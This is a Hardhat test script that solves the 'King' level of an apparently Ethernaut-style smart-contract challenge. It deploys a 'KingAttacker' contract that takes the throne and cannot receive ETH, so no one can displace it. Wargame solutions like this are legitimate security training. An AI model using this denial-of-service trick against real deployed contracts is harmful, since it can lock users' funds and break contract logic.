const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("King");
  const challengeAddress = await createChallenge(`0x3049C00639E6dfC269ED1451764a046f7aE500c6`, ethers.parseEther(`0.001`))
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 9-King", async function () {
  const challenge = await getChallenge();
  // KingAttacker contract does not have receive() or fallback() function, thus not able to receive eth.
  const factory = await ethers.getContractFactory("KingAttacker");
  const contract = await factory.deploy(await challenge.getAddress(), {value: ethers.parseEther("0.002")});
  await contract.waitForDeployment();
  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
